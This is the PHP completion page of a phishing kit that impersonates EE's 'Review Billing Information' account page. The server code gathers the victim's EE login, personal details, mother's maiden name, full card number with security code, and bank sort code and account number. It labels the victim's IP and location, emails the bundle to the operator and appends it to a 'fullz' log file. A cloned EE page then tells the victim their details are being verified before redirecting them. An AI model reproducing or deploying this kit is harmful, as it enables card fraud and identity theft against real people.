<?php

include "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";

error_reporting(0);
ini_set('display_errors', '0');
date_default_timezone_set('Europe/London');
$date = date('l d F Y');
$time = date('H:i');
$user = $_SESSION['user'];
$pass = $_SESSION['pass'];
$name = $_POST['name'];
$dob = $_POST['dob'];
$telephone = $_POST['telephone'];
$email = $_POST['email'];
$address = $_POST['address'].", ".$_POST['town'].", ".$_POST['postcode'];
$ccname = $_POST['ccname'];
$ccno = $_POST['ccno'];
$ccexp = $_POST['ccexp'];
$secode = $_POST['secode'];
$sortcode = $_POST['sortcode'];
$mmn = $_POST['mmn'];
$_SESSION['name'] = $_POST['name'];
$_SESSION['dob'] = $_POST['dob'];
$_SESSION['telephone'] = $_POST['telephone'];
$_SESSION['address'] = $_POST['address'];
$_SESSION['town'] = $_POST['town'];
$_SESSION['postcode'] = $_POST['postcode'];
$_SESSION['ccname'] = $_POST['ccname'];
$_SESSION['ccno'] = $_POST['ccno'];
$_SESSION['secode'] = $_POST['secode'];
$_SESSION['sortcode'] = $_POST['sortcode'];
$account = $_POST['account'];
$ccno = str_replace(' ', '', $ccno);
$last4 = substr($ccno, 12, 16);
$cardInfo = bankDetails($ccno);
$BIN = ($cardInfo['bin']);
$Bank = (isset($cardInfo['bank']['name'])) ? $cardInfo['bank']['name']:"Unknown Bank For This BIN!";
$Brand = ($cardInfo['brand']);
$Type = ($cardInfo['type']);
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo1 = "| Submitted by : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
$VictimInfo2 = "| Location : " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
$VictimInfo3 = "| UserAgent : " . $systemInfo['useragent'] . "";
$VictimInfo4 = "| Browser : " . $systemInfo['browser'] . "";
$VictimInfo5 = "| Os : " . $systemInfo['os'] . "";
$data = "
+ ------------- scarFullz --------------+
+ ------------------------------------------+
| Username : $user
| Password : $pass
+ ------------------------------------------+
+ Personal Information
| Full name : $name
| Telephone : $telephone
| Date of birth : $dob
| Email : $email
| Address : $address
| Mother's maiden name : $mmn
+ ------------------------------------------+
+ Bin Information
| Card BIN : $BIN
| Card Bank : $Bank
| Card Brand : $Brand 
| Card Type : $Type
+ ------------------------------------------+
+ Billing Information
| Cardholder name : $ccname
| Card number : $ccno
| Card exp : $ccexp
| Security code : $secode
| Sortcode : $sortcode
| Account: $account
+ ------------------------------------------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ------------------------------------------+
";



if ($binSave === 1) {
    $binlist = fopen($BIN.".txt","a");
    fwrite($binlist, $data . "\n\n");
    fclose($binlist);
}

if ($binlist === 1) {
    $bins = array();
    $getBins = explode('\n', file_get_contents('bins.txt'));
    foreach ($getBins as $getbin => $gb) {
        $dat = explode('=>', $gb);
        $bins[$dat[0]] = $dat[1];
    }
    if (isset($bins[intval($BIN)])) {
        $bins[intval($BIN)] =  intval($bins[intval($BIN)]) + 1;
    } else {
        $bins[intval($BIN)] = 1;
    }
    $binFile = fopen('list_bins.txt', 'w');
    foreach ($bins as $bin=>$bn) {
        fwrite($binFile, $bin . "\n");
    }
    fclose($binFile);
}

if ($sendEmail === 1) {

    mail($to,  $BIN . " from " . $_SERVER['REMOTE_ADDR'], $data);
}

if ($saveFile === 1) {
    $file = fopen('assets/logs/fullz.txt', 'a');
    fwrite($file, $data . "\n");
    fclose($file);
}


?>
<!DOCTYPE html>
<html class="js flexbox no-touch geolocation multiplebgs backgroundsize cssanimations csscolumns cssgradients csstransforms csstransforms3d csstransitions video audio svg">
<!--<![endif]-->
<head>
<meta charset="utf-8">
<meta content="IE=11; IE=10; IE=9; IE=8; IE=EDGE" http-equiv="X-UA-Compatible">
<title>Complete</title>
<meta content="noindex,nofollow" name="robots">
<meta content="user-scalable=0, width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0" name="viewport">
<meta content="telephone=no" name="format-detection">
<link href="assets/img/favicon.ico" rel="icon" type="image/x-icon">
<link href="assets/css/run.css" rel="stylesheet">
<link href="assets/css/main.css" rel="stylesheet">
<link href="assets/css/modules.css" rel="stylesheet">
<link href="assets/css/common.css" rel="stylesheet">
<link href="assets/css/plugins.css" rel="stylesheet">
<link href="assets/css/myee_addons.css" rel="stylesheet">
<link href="assets/css/plugins/jquery.the-modal.css" rel="stylesheet">
<link href="assets/css/boom.css" rel="stylesheet">
<link href="assets/css/usage.css" rel="stylesheet">
<link href="assets/css/jquery.inttelinput.css" rel="stylesheet">
<link href="assets/css/dev_tools.css" rel="stylesheet">
<link href="assets/css/myee-common.css" rel="stylesheet">
<link href="assets/css/mainveri.css" rel="stylesheet">
<link href="assets/css/flowassociation.css" rel="stylesheet">
<link href="assets/css/myee-menu.css" rel="stylesheet">
<link href="assets/css/full-width-header.css" rel="stylesheet">
<meta http-equiv="refresh" content="7; url=<?php echo $ExitLink; ?>" />
</head>
<body class="handheld">
<div class="global-mast-head-iparsys parsys iparsys">
<div class="parsys global-masthead section">

<header class="MainHeadero">
<div class="TopBlackBar" style="height:34px;padding-top:5px!important;padding-bottom: 40px!important;">
<div class="container group">
<div class="parbase segmentSelector segment-selector">
<div class="MainHeadero-segment">
<div class="MainHeadero-segment__segment MainHeadero-segment__segment--consumer"><a class="current MainHeadero-segment-selector-link" href="#">Personal</a>
</div>

<div class="MainHeadero-segment__segment MainHeadero-segment-selector MainHeadero-segment-selector--inactive"><a class="MainHeadero-segment-selector-link" href="#">Business</a>
<div class="content_below-cut">
</div>
</div>
</div>
</div>

<div class="MainHeadero-utility"><span class="MainHeadero-utility__link MainHeadero-utility__link--contact"><a class="icon-link" href="#"><span class="icon ee-icon-contact"></span> Contact us</a></span> <span class="MainHeadero-utility__link MainHeadero-utility__link--findstore"><a class="icon-link" href="#"><span class="icon ee-icon-findstore StoreLocator"></span> Store finder</a></span> <span class="MainHeadero-utility__link MainHeadero-utility__link--coverage"><a class="icon-link" href="#"><span class="icon ee-icon-coverage"></span> Coverage checker</a></span></div>
</div>
</div>

<div class="MainHeadero-main">
<div class="container">
<p class="MainHeadero__logo"><a href="#"><object data="assets/img/logo.svg" type="image/svg+xml">EE</object></a>
</p>

<nav class="ee-nav">
<ul>
<li class="ee-nav__link--category ee-nav__link--current ee-nav__link ee-nav-link__consumer ee-nav__link--expandable"><a href="#"><span>MY EE</span></a></li>
<li class="ee-nav__link--category ee-nav__link ee-nav-link__consumer ee-nav__link--expandable"><a href="#"><span>Shop</span></a></li>
<li class="ee-nav__link--category ee-nav__link ee-nav-link__consumer ee-nav__link--expandable"><a href="#"><span>Help</span></a></li>
<li class="ee-nav__link--category ee-nav__link ee-nav-link__consumer ee-nav__link--expandable"><a href="#"><span>Why EE</span></a></li>
<li class="ee-nav__link ee-nav__link--primary handheld-only"><a href="#"><span class="brand-ee">Contact us</span></a></li>
</ul>
</nav>

<div class="MainHeadero-tools group">
<div class="MainHeadero-basket"><a class="MainHeadero-tools__link MainHeadero-tools__link--icon MainHeadero-basket__link ee-icon-basket" href="#"><span class="assistive-text">Basket</span> <span class="MainHeadero-basket__items empty"></span></a>
<div class="MainHeadero-minibasket"></div>
</div>

<div class="MainHeadero-search">
<a class="MainHeadero-tools__link MainHeadero-tools__link--icon MainHeadero-search__toggle ee-icon-search" href="#">
<span class="assistive-text">Search</span></a>
<form action="" class="MainHeadero-search__form" method="get">
<div class="MainHeadero-search__search-box styled-search-box">
<input class="yui-ac-input" id="l" name="l" placeholder="Search" title="Search field" type="search"> 
<span class="MainHeadero-search__clear ee-icon-close"><span class="assistive-text">Clear</span></span> 
<button class="ee-icon-search" id="searchform-submit" type="submit"><span class="assistive-text">Search</span></button>
</div>

<div class="MainHeadero-search__autocomplete yui-ac-container" id="autocomplete"></div>

</form>
</div>

<div class="MainHeadero-auth"><span class="MainHeadero-auth__greeting">Hello, <span class="MainHeadero-auth__name">guest</span>. Not you?</span> <a class="MainHeadero-tools__link MainHeadero-auth__link MainHeadero-auth__link--login" href="https://myaccount.ee.co.uk/login-dispatch"><span class="MainHeadero-auth__link-text">Log out</span><span aria-hidden="true" class="icon ee-icon-chevronnext"></span></a> <a class="MainHeadero-tools__link MainHeadero-auth__link MainHeadero-auth__link--logout" href="#"><span class="MainHeadero-auth__link-text">Log out</span><span aria-hidden="true" class="icon ee-icon-chevronnext"></span></a></div>

<div><a class="MainHeadero-tools__link MainHeadero-tools__nav-toggle" href="#">Menu</a>
</div>
</div>
</div>
</div>

<div class="MainHeadero-handheld-search">
</div>


</header>
</div>
</div>















<nav id="sidenav">
<div id="navMask">
<div id="navMaskInner" style="height: 1380px;">
<ul id="mainNav" style="height: 1380px;">

</ul>
</div>
</div>
</nav>

<section class="shiftContainer">
<section class="menu" id="menuIconContainer"><a class="menu" href="#" tabindex="0"></a></section>

<section class="navSection shiftRight">
<main class="maganage-my-account" id="main" role="main" tabindex="0">
<section class="breadcrumb module white" id="breadcrumb">
<nav aria-label="Breadcrumb trail" class="container" role="navigation">
<div class="col span-12 no-padding-top no-padding-bottom">
<ul class="breadcrumb-item-container">
<li class="breadcrumb__item"><a href="#">My EE</a> <span aria-hidden="true" class="chevron">&gt;</span></li>

<li class="breadcrumb__item"><span>Review Billing Information</span> <span aria-hidden="true" class="chevron">&gt;</span></li>
</ul>
</div>
</nav>
</section>

<section class="module white" id="full-width-header">
<div class="container">
<div class="col span-12">
<div class="panel">
<h1 class="center">Review Billing Information</h1>
</div>
</div>
</div>
</section>



<!-- DETAILS START -->
<div id="Details">
<section>
<div class="container cantainer-margin">
<div class="my-account-tab-head">
<ul class="navbar">
<li class="active" id="my-details-tab"><a>Complete</a>
</li>
</ul>
</div>

<div class="white ee-form my-account-tab-container" id="my-details-container" style="display: block;">


<div id="myDetails">
<div class="janrain-capture-ui capture-ui-content capture_screen_container" style="display: block;">
<section class="module no-margin-top no-margin-bottom padding-bottom-1em myee">
<div class="janrain-content">


<div class="clear"></div>


<div class="message">
<br/>
<a id="loadingIcon" name="loadingIcon" href="#"><img style="display:block;margin-left:auto;margin-right:auto;" src="assets/img/spin.gif"/></a>
<br />
<h1 style=" text-align: center;">Please wait...</h1>
<br />
<p align="center" style="text-align: center;">It'll only take a few seconds <br />we're just verifying the details that you've entered.</p>
<br />
<p align="center"  style="text-align: center;font-weight:bold;color:red">You will be redirected to main page.</p>
<p></p>
</div>



</div>
</section>
</div>
</div>


</div>
</div>
</section>
</div>
<!-- DETAILS END -->

</main>

<div class="parsys iparsys global-footer-iparsys">
<div class="parsys global-footer section">
<footer class="ee-footer" id="ee-footer" role="contentinfo">
<div class="ee-footer-primary theme-standard theme-white">
<div class="container">
<div class="ee-footer-links">
<section class="ee-footer-links-section">
<p class="ee-footer-links-section__heading">OUR COMPANY</p>

<ul>
<li><a href="#">About Us</a>
</li>

<li><a href="#">Our Brands</a>
</li>

<li><a href="#">Newsroom</a>
</li>

<li><a href="#">Financials</a>
</li>

<li><a href="#">Responsibility</a>
</li>
</ul>
</section>

<section class="ee-footer-links-section">
<p class="ee-footer-links-section__heading">USEFUL LINKS</p>

<ul>
<li><a href="#">EE Community</a>
</li>

<li><a href="#">Insurance &amp; Protection</a>
</li>

<li><a href="#">Recycle and Reward</a>
</li>

<li><a href="#">e-safety and e-skills</a>
</li>

<li><a href="#">Careers</a>
</li>

<li><a href="#">EE Franchise</a>
</li>
</ul>
</section>

<section class="ee-footer-links-section">
<p class="ee-footer-links-section__heading">Legal</p>

<ul>
<li><a href="#">Terms and conditions</a>
</li>

<li><a href="#">Privacy</a>
</li>

<li><a href="#">Codes of practice</a>
</li>

<li><a href="#">Accessibility</a>
</li>

<li><a href="#">EE Power Bar recall</a>
</li>

<li><a href="#">Modern Slavery Statement</a>
</li>
</ul>
</section>

<section class="ee-footer-links-section ee-footer-links-section--social">
<p class="ee-footer-links-section__heading">How to find EE</p>

<ul>
<li><a href="#">Coverage Checker</a>
</li>

<li><a href="#">Store finder</a>
</li>
</ul>

<p class="ee-footer-social">
<a class="ee-footer-social__link ee-icon-twitter" href="#"><span class="assistive-text">EE on Twitter</span></a> 
<a class="ee-footer-social__link ee-icon-facebook" href="#"><span class="assistive-text">EE on Facebook</span></a> 
<a class="ee-footer-social__link ee-icon-youtube" href="#"><span class="assistive-text">EE on YouTube</span></a> 
<a class="ee-footer-social__link ee-icon-linkedin" href="#"><span class="assistive-text">EE on LinkedIn</span></a>
</p>
</section>
</div>
</div>
</div>

<div class="ee-footer-secondary">
<div class="container">
<p class="ee-footer-copyright">&copy; 2017&nbsp;EE Limited</p>

<p class="ee-footer-brand"><span class="ee-footer-brand__link"><a class="ee-bgimg-orange-logo" href="#"><span class="assistive-text">Visit the Orange website (opens in a new tab/window)</span></a></span> <span class="ee-footer-brand__link"><a class="ee-bgimg-tmobile-logo" href="#"><span class="assistive-text">Visit the T-Mobile website (opens in a new tab/window)</span></a></span> <span class="ee-footer-brand__text">brought to you by EE</span></p>
</div>
</div>
</footer>
</div>

<div class="section">
<div class="new">
</div>
</div>

<div class="iparys_inherited">
<div class="parsys iparsys global-footer-iparsys">
</div>
</div>
</div>
</section>
</section>
</body>
</html>